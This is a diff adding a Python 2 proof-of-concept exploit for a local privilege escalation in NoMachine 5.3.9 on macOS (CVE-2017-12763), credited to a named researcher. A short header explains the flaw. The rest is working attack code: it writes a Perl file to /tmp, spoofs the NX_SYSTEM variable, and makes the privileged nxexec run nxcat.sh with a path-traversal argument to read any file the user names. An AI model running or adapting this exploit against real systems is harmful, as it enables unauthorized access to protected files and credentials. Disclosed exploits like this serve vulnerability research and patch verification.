@@ -1,0 +1,42 @@
+"""
+# Exploit Title: NoMachine LPE - Local Privilege Escalation
+# Date:  09/08/2017
+# Exploit Author: Daniele Linguaglossa
+# Vendor Homepage: https://www.nomachine.com
+# Software Link: https://www.nomachine.com
+# Version: 5.3.9
+# Tested on: OSX
+# CVE : CVE-2017-12763
+
+NoMachine uses a file called nxexec in order to execute different action as super user, nxexec allow to execute
+sh files within a sandboxed path, additionally other checks such as parent process name, parent process path are
+performed in order to be sure only NoMachine application are allowed to execute nxexec.
+nxnode.bin allow to spoof a local path via NX_SYSTEM environment variable, this is use to craft a path where a perl
+file will be executed, this PoC exploit the NX_SYSTEM variable in order to allow a custom perl file to call nxexec
+and execute privileged nxcat.sh script in order to read any file on filesystem.
+"""
+
+import os
+import sys
+
+print "[!] NoMachine - EoP - Read any file by @dzonerzy"
+if len(sys.argv) == 4:
+    nxnode = sys.argv[1]
+    nxexec = sys.argv[2]
+    toread = sys.argv[3]
+    user = os.environ.get("USER")
+    tmp_path = "/tmp/lib/perl/nxnode"
+    tmp_file = "/tmp/lib/perl/nxnode/nxnode.pl"
+    tmp_file_content = "print \"[*] Exploiting vulnerability\\n\";" \
+                       "system(\"{0} " \
+                       "nxcat.sh 1 {1} 2 '../../../../../..{2}'\");".format(nxexec, user, toread)
+    print "[*] Crafting tmp environment"
+    os.system("mkdir -p {0}".format(tmp_path))
+    with open(tmp_file,"w") as tmp:
+        tmp.write(tmp_file_content)
+        tmp.close()
+    os.system("NX_SYSTEM=/tmp {0}".format(nxnode))
+    os.unlink(tmp_file)
+    os.system("rm -r /tmp/lib")
+else:
+    print "Usage: {0} <path of nxnode.bin> <path of nxexec> <file to read>".format(sys.argv[0])
